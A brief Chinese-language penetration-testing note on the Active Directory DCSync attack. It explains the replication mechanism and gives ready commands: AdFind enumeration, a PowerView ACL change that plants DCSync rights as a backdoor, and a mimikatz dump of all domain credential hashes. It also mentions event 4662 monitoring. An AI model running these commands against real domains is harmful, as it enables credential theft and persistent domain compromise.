
# Dcsync  
## Dcsync的原理 

在RPC请求当中传输到DRSUAPI（目录复制服务的API）的DsGetNCChanges的操作，这个操作能够用于从域控当中复制数据。  

相关的ACL权限为 

```
DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)；

DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)；

DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)；
```

**寻找其中存在DCSync权限的用户**

```
AdFind.exe -s subtree -b "DC=whoamianony,DC=org" -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"Replicating Directory Changes";; -recmute
```



直接使用powerview添加ACE的方式 

```
Add-DomainObjectAcl -TargetIdentity "DC=0day,DC=org" -PrincipalIdentity jack -Rights DCSync
```



一般在域内拥有这个权限的用户为 

```
Domain admins
Enterprise Admins 
域控制器的计算机账户
```

注意其中的监控日志 

Event ID 号 4662 

ACLight可以查看后门



## 利用的思路 

域控制器上执行的都可以 

域内主机上执行 

1、mimikatz 

导入票据进行dcsync 

利用over pass the hash

## 使用的方式 

```
lsadump::dcsync /domain:xxx.com /all
```



## refer

https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&mid=2247527164&idx=1&sn=7f1d6db1d229b06138cf05bdaf3ea76a

